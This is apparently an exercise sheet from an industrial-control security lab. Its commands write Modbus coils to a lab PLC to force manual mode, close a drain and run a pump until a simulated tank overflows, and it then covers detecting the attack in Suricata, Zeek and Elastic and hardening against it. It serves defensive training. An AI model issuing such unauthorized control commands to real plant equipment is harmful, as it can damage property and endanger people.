# 02 — Unauthorized command → tank overflow

**Objective:** Directly command the PLC: switch to MANUAL, start the pump, close the drain, and overflow the tank. Detect on the wire *and* on the physics.

**ATT&CK for ICS:** T0855 Unauthorized Command Message · T0858 Change Operating Mode · T0831 Manipulation of Control · T0879 Damage to Property

## Setup
Assumed-breach toggle on. HMI open in a browser so you can watch.

## Attack (Kali)

```bash
date -u
python3 ot_attack.py --target 10.N.40.10 write-coil 2 0   # AUTO -> MANUAL
python3 ot_attack.py --target 10.N.40.10 write-coil 1 0   # drain closed
python3 ot_attack.py --target 10.N.40.10 write-coil 0 1   # pump ON
watch -n 2 python3 ot_attack.py --target 10.N.40.10 read  # watch it climb past 95 % to overflow
```
The HMI shows MANUAL and the high alarm — but a real operator might "fix" it from the HMI, so try clicking AUTO and see what happens (the attacker can just write again).

## What you should see

| Source | Evidence |
|---|---|
| Suricata | 9000001 (write from unauthorized host), 9000003 (mode coil write) |
| Zeek | `modbus.log` `WRITE_SINGLE_COIL` from `10.N.99.10`; `modbus_detailed.log` shows address 2 value false, address 0 value true; notice `OTLab::Unauthorized_Modbus_Write` |
| Elastic | `otlab-0001` (critical), `otlab-0005`, then `otlab-0008` tank overflow a few minutes later |
| Process log | `tank.overflow: true`, `plc_outputs.mode_auto: false` |

## Detect — exercise
Build a **Timeline** in Elastic Security: the Kali write → coil change in process log → high alarm → overflow. How many seconds between the first unauthorized write and the overflow alert? That is the response window a real plant would have.

## Respond & harden
1. From the HMI: set AUTO, open drain. Note that the attacker can override you — the real fix is network.
2. Disable the toggle; confirm writes fail.
3. Stretch: add an Ansible-managed `iptables` rule on the PLC VM allowing 502 only from HMI/EWS/field (host-based enforcement, like a PLC's own access list).

## Journal prompts
- Which single detection would you trust most, and why?
- What would a real PLC's safety system (SIS) do here that this lab doesn't model?
